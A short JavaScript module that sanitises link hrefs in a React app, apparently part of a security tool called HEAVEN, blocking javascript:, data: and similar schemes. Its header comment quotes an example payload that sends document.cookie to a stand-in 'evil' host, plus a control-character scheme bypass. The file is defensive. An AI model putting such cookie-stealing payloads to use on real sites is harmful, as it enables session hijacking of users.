// HEAVEN — link-href sanitiser.
//
// React does NOT sanitise the `href` attribute, so a value like
// `javascript:fetch('//evil/'+document.cookie)` rendered as <a href={value}>
// executes in the app origin (where the session token lives) the moment a user
// clicks it. Several link sinks are fed by data HEAVEN ingests from outside:
// a finding's `references`, CVE-feed reference and exploit URLs (OSV / NVD /
// CIRCL / Exploit-DB), and LLM output rendered as Markdown. Route every
// data-derived href through this so only navigable schemes survive.
//
// Keeps http / https / mailto plus relative, in-page (#...) and scheme-relative
// (//host) links; anything carrying another explicit scheme (javascript:,
// data:, vbscript:, file: ...) collapses to "#". Browsers ignore leading and
// embedded ASCII control / whitespace bytes when resolving a scheme (so
// "java\tscript:alert(1)" still runs), so strip those before deciding.
export function safeHref(url) {
  const raw = url == null ? "" : String(url);
  // eslint-disable-next-line no-control-regex
  const probe = raw.replace(/[\x00-\x20]/g, "").toLowerCase();
  const m = /^([a-z][a-z0-9+.-]*):/.exec(probe);
  if (m && !["http", "https", "mailto"].includes(m[1])) return "#";
  return raw;
}

export default safeHref;
